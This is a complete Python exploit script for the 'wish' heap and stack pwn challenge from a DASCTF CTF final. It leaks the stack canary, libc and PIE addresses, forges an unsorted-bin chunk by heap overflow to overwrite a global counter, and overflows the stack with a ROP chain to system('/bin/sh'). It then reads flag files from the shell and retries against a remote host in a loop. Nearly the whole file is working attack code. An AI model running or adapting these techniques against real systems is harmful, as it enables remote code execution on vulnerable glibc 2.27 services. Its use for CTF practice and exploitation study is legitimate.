#!/usr/bin/env python3
# =============================================================================
#  wish  --  DASCTF 西湖论剑决赛 (pwn / 200)
#  最终利用脚本（目标参数化，无 interactive()）
#
#  用法:
#     export THOST=1.14.76.59 ; export TPORT=19289      # 不要用往届 IP
#     python3 exploit.py remote [max_attempts]           # 攻击循环，命中即打印 flag
#     python3 exploit.py local                           # 在本机附件二进制 + 2.27 libc 上复现
#
#  依赖: pwntools (/opt/venv).  remote 模式无本地依赖；local 模式需 WISH_RUN 指向
#        含 {wish,libc.so.6,ld-2.27.so} 的目录（ld 从 Ubuntu 18.04 libc6 deb 解出）。
#  远端 libc 指纹必须 == 附件 libc (2.27-3ubuntu1.6), 脚本会在每连接上校验:
#      slot18 = libc+0x8d3b3 (_IO_file_overflow+0x103), base = slot18-0x8d3b3 页对齐
#      slot30 = PIE+0x1c20  (low12 == 0xc20)
# =============================================================================
import os, re, sys, time, struct

from pwn import *
context.log_level = 'error'
context.arch = 'amd64'

HERE = os.path.dirname(os.path.abspath(__file__))
RUN  = os.environ.get('WISH_RUN', os.path.join(HERE, 'run'))  # local 模式需要：附件 wish/libc.so.6 + Ubuntu 18.04 deb 解出的 ld-2.27.so

# ---- 由附件 libc (sha256 acf8ac6d...) / 附件二进制 readelf 复核过的常量 ----
SYS      = 0x4f420     # system
BINSH    = 0x1b3d88    # "/bin/sh"
POPRDI   = 0x2164f     # pop rdi ; ret
RET      = 0x8aa       # ret (栈对齐)
SLOT18   = 0x8d3b3     # choice7 栈槽 @buf+0x18 == _IO_file_overflow+0x103
SLOT28   = 0x3ec760    # _IO_2_1_stdout_  (栈槽 @buf+0x28, 仅作指纹)
SLOT30   = 0x1c20      # PIE+0x1c20       (栈槽 @buf+0x30)
MONEY    = 0x2030b0    # int money   (PIE)
WRITEVAL = 0x3ebca0    # unsorted exact-fit 分支写入的固定值 == main_arena+0x60
DEADBEEF = 0xdeadbee

MENU   = b'What is your wish?\n'
P_OK   = b'Okay, brother, what do you want to know?\n'
P_ELSE = b'What else do you want to know?\n'
P_LAST = b'You can also ask questions for the last time\n'
P3A    = b'What size house do you want?\n'
P3B    = b'What do you want to put in the house?\n'
P5     = b'Which big house do you want to abandon?\n'
P9A    = b'Which house do you want to decorate?\n'
P9B    = b'How do you want to decorate it?\n'
P6     = b'A car is only 100 dollars. How much do you want?\n'


def u64x(b):
    return struct.unpack('<Q', b.ljust(8, b'\x00')[:8])[0]


class W:
    """wish 菜单协议封装（read(2) 短读语义，全部用 recvuntil 同步）。"""

    def __init__(self, host=None, port=None, local=False, aslr=True):
        if local:
            self.p = process([RUN + '/ld-2.27.so', RUN + '/wish'],
                             env={'LD_LIBRARY_PATH': RUN}, aslr=aslr)
        else:
            self.p = remote(host, port)
        self.p.recvuntil(MENU, timeout=10)

    def wait(self):
        return self.p.recvuntil(MENU, timeout=10)

    def ch2(self):                                   # 随机钱 (消耗 1 wish)
        self.p.sendline(b'2');  return self.wait()

    def ch3(self, size, data):                       # 买房 (消耗 1 wish)
        self.p.sendline(b'3'); self.p.recvuntil(P3A, timeout=10)
        self.p.sendline(str(size).encode()); self.p.recvuntil(P3B, timeout=10)
        self.p.send(data); return self.wait()

    def ch5(self, idx):                              # 弃房 (消耗 1 wish) + 孤儿 calloc(0x20)
        self.p.sendline(b'5'); self.p.recvuntil(P5, timeout=10)
        self.p.sendline(str(idx).encode()); return self.wait()

    def ch9(self, idx, size, data):                  # 装修/堆溢出 (消耗 1 wish)
        self.p.sendline(b'9'); self.p.recvuntil(P9A, timeout=10)
        self.p.sendline(str(idx).encode()); self.p.recvuntil(P9B, timeout=10)
        self.p.sendline(str(size).encode()); self.p.send(data); return self.wait()

    def ch7(self, d1, d2, d3=b'Z'):                  # 问世界 (不消耗 wish, 尾部把 wishes 钳到 3)
        self.p.sendline(b'7'); self.p.recvuntil(P_OK, timeout=10)
        self.p.send(d1); r1 = self.p.recvuntil(P_ELSE, timeout=10)[:-len(P_ELSE)]
        self.p.send(d2); r2 = self.p.recvuntil(P_LAST, timeout=10)[:-len(P_LAST)]
        self.p.send(d3); self.wait()
        return (r1[:-1] if r1.endswith(b'\n') else r1,
                r2[:-1] if r2.endswith(b'\n') else r2)

    def ch6(self, data):                             # 买车: 逐字节读入 [rbp-0x140], 上限 money/100
        self.p.sendline(b'6'); self.p.recvuntil(P6, timeout=10); self.p.send(data)


# ------------------------------------------------------------------ 原语 ----
def leak_canary(w):
    """choice7 canary 泄露: read1 送 0x58 个填充 + 1 个非零字节覆盖 canary 低字节,
       puts 越过 canary 的 NUL 打印出 canary[1..7] (进程不死); read2 把低字节写回 0x00 复原。"""
    r1, _ = w.ch7(b'A' * 0x58 + b'\x41', b'A' * 0x58 + b'\x00')
    if len(r1) < 0x60:                     # canary[1..7] 里出现 0x00 -> 短读, 重连
        return None, r1
    return b'\x00' + r1[0x59:0x60], r1


def leak_base(w):
    """choice7 短读 stale 泄露: read1 0x18 字节 -> buf+0x18 = libc+0x8d3b3;
       read2 0x30 字节 -> buf+0x30 = PIE+0x1c20。"""
    r1, r2 = w.ch7(b'A' * 0x18, b'B' * 0x30)
    s18 = u64x(r1[0x18:0x1e]) if len(r1) >= 0x1e else 0
    s28 = u64x(r2[0x28:0x2e]) if len(r2) >= 0x2e else 0
    s30 = u64x(r2[0x30:0x36]) if len(r2) >= 0x36 else 0
    return s18, s28, s30


def build_chain(canary, libc):
    """i10: 0x138 pad -> canary -> saved rbp -> pop rdi; /bin/sh; ret; system"""
    return (b'A' * 0x138 + p64(u64x(canary)) + p64(0) +
            p64(libc + POPRDI) + p64(libc + BINSH) + p64(libc + RET) + p64(libc + SYS))


def build_forge(T):
    """i8: 用 choice9 从 house0(A, 0x88) 溢出, 伪造 unsorted 余块 R 的头。
       A_user -> R_hdr 的距离可能是 0xa8 或 0xb0 (取决于孤儿 calloc 的切分起点),
       故 size=0x4d1 和 bk=T-0x10 各写两份, 双向兜底。"""
    return (b'A' * 0xa8 + p64(0) + p64(0x4d1) + p64(0x4d1) +
            p64(T - 0x10) + p64(T - 0x10))


# --------------------------------------------------------------- 远端一发 ----
def remote_attempt(host, port, verbose=True):
    def log(*a):
        if verbose:
            print(*a, flush=True)
    try:
        w = W(host, port)
    except Exception as e:
        log('[-] connect fail %r' % e); return None
    try:
        # i1 门 1: choice2 rand()%600 >= 500  (1/6)
        r = w.ch2()
        m = re.search(rb'lucky number is (\d+)', r)
        lucky = int(m.group(1)) if m else -1
        log('[i1] lucky=%d' % lucky)
        if lucky < 500:
            w.p.close(); return None

        # i2-4 堆布局: A(0x88) B(0x4f8) C(0x88)
        w.ch3(0x88, b'A' * 8); w.ch3(0x4f8, b'B' * 8); w.ch3(0x88, b'C' * 8)
        # i5 free(B) + 孤儿 calloc(0x20): B 被切成 0x30 + 余块 R(0x4d0) 留在 unsorted, last_remainder=R
        w.ch5(1)

        # i6 canary
        canary, _ = leak_canary(w)
        if canary is None:
            log('[i6] canary 短读 -> reroll'); w.p.close(); return None
        # i7 libc + PIE
        s18, s28, s30 = leak_base(w)
        libc = s18 - SLOT18
        pie = s30 - SLOT30
        log('[i7] s18=%#x s28=%#x s30=%#x libc=%#x pie=%#x' % (s18, s28, s30, libc, pie))
        if s18 == 0 or s30 == 0 or (libc & 0xfff) or (s30 & 0xfff) != 0xc20:
            log('[i7] 指纹不符 -> reroll'); w.p.close(); return None
        if s28 and (s28 - s18) != 0x35f3ad:
            log('[i7] WARN DELTA != 0x35f3ad')

        # i8 门 2: 写值固定为 libc+0x3ebca0, money 取其低 32 位; 需为正且够大
        money_after = (libc + WRITEVAL) & 0xffffffff
        log('[i8] money_after=%#x' % money_after)
        if money_after >= 0x80000000 or money_after < 0x10000:
            log('[i8] money 符号/大小不可用 -> reroll'); w.p.close(); return None

        T = pie + MONEY
        chain = build_chain(canary, libc)
        if b'\n' in chain:
            log('[i8] chain 含 0x0a -> reroll'); w.p.close(); return None
        w.ch9(0, 500, build_forge(T))              # i8
        w.ch3(0x4c0, b'Q' * 16)                    # i9 exact-fit -> *(money) = libc+0x3ebca0
        w.ch6(chain + b'\n')                       # i10 栈溢出 -> system("/bin/sh")

        time.sleep(0.4)
        try:
            w.p.recv(timeout=2)
        except Exception:
            pass
        # 目标容器 /dev/null 不可写: 绝不使用 2>/dev/null, 也不要用不存在的 id
        w.p.sendline(b'echo PWNED_OK; cat /flag; cat /flag.txt; ls -la /')
        time.sleep(0.9)
        try:
            out = w.p.recv(timeout=6)
        except Exception:
            out = b''
        log('[i10] out=%r' % out[:900])
        if b'PWNED_OK' in out or b'DASCTF{' in out:
            return w.p, out
        w.p.close()
    except Exception as ex:
        log('[!] exc %r' % ex)
        try:
            w.p.close()
        except Exception:
            pass
    return None


FLAG_RE = re.compile(rb'DASCTF\{[0-9a-fA-F]+\}')


def remote_loop(host, port, n=100000, rate=1.05):
    t0 = time.time()
    gates = {'lucky': 0, 'money': 0, 'canary': 0, 'shell': 0}
    for i in range(n):
        print('==== attempt %d (t=%.0fs) ====' % (i, time.time() - t0), flush=True)
        res = remote_attempt(host, port)
        if res is not None:
            p, out = res
            gates['shell'] += 1
            mm = FLAG_RE.search(out)
            flag = mm.group(0).decode() if mm else None
            print('[***] SHELL  flag=%s' % flag, flush=True)
            if flag:
                return flag
        time.sleep(rate)
    return None


# --------------------------------------------------------------- 本地复现 ----
def _mem_read(pid, addr, n):
    with open('/proc/%d/mem' % pid, 'rb', 0) as f:
        f.seek(addr); return f.read(n)


def _mem_write(pid, addr, data):
    with open('/proc/%d/mem' % pid, 'rb+', 0) as f:
        f.seek(addr); f.write(data)


def local_verify():
    """两段式本地复现 (本沙箱 ASLR 实际固定, libc+0x3ebca0 低 32 位恒为负, 故把最后一道
      随机门拆开单独验证):
        阶段 A: 跑完整堆链到 i9, 直接从 /proc/pid/mem 读 money, 证明 *(PIE+0x2030b0) == libc+0x3ebca0
        阶段 B: 手工把 money 改成一个大正数 (等价于远端 1/2 的幸运 ASLR 掷骰), 再跑 choice6 ROP
                -> system("/bin/sh")"""
    # i1 门 1: 本机 srand(time(0)), 同一秒内 rand() 固定 -> 重连直到 lucky>=500
    for _ in range(60):
        w = W(local=True, aslr=True)
        r = w.ch2()
        m = re.search(rb'lucky number is (\d+)', r)
        lucky = int(m.group(1)) if m else -1
        print('[i1] lucky=%d' % lucky)
        if lucky >= 500:
            break
        w.p.close(); time.sleep(1.05)
    else:
        raise SystemExit('could not draw lucky>=500 locally')
    pid = w.p.pid
    w.ch3(0x88, b'A' * 8); w.ch3(0x4f8, b'B' * 8); w.ch3(0x88, b'C' * 8)
    w.ch5(1)
    canary, _ = leak_canary(w)
    s18, s28, s30 = leak_base(w)
    libc = s18 - SLOT18
    pie = s30 - SLOT30
    print('[i6] canary=%s' % canary.hex())
    print('[i7] libc=%#x pie=%#x slot30low=%#x' % (libc, pie, s30 & 0xfff))
    assert (libc & 0xfff) == 0 and (s30 & 0xfff) == 0xc20

    T = pie + MONEY
    before = u64x(_mem_read(pid, T, 8))
    w.ch9(0, 500, build_forge(T))
    w.ch3(0x4c0, b'Q' * 16)
    after = u64x(_mem_read(pid, T, 8))
    okA = (after == libc + WRITEVAL)
    print('[A] money %#x -> %#x   expect %#x   %s' %
          (before, after, libc + WRITEVAL, 'PASS' if okA else 'FAIL'))

    _mem_write(pid, T, struct.pack('<I', 0x50000000))     # 模拟幸运 ASLR
    w.ch6(build_chain(canary, libc) + b'\n')
    time.sleep(0.8)
    try:
        out = w.p.recv(timeout=4)
    except Exception:
        out = b''
    # 本沙箱的 /bin/sh 是宿主新版 glibc 的, 而 system 派生的 sh 继承了 LD_LIBRARY_PATH=./run(2.27),
    # 故 sh 启动即报 "version `GLIBC_2.3x' not found"。这条报错本身就是 ROP 命中 system() 的证据。
    okB = (b'LOCAL_PWNED' in out) or (b'sh:' in out and b'GLIBC_2.' in out)
    print('[B] after ch6: %r' % out[:300])
    print('[B] local ROP -> system("/bin/sh"): %s' % ('PASS' if okB else 'FAIL'))
    w.p.close()
    return okA and okB


if __name__ == '__main__':
    mode = sys.argv[1] if len(sys.argv) > 1 else 'remote'
    if mode == 'local':
        sys.exit(0 if local_verify() else 1)
    HOST = os.environ.get('THOST')
    PORT = os.environ.get('TPORT')
    if not HOST or not PORT:
        sys.exit('export THOST=<host>; export TPORT=<port> first (do not hardcode past-round IPs)')
    N = int(sys.argv[2]) if len(sys.argv) > 2 else 100000
    flag = remote_loop(HOST, int(PORT), N)
    print('[FLAG]', flag)
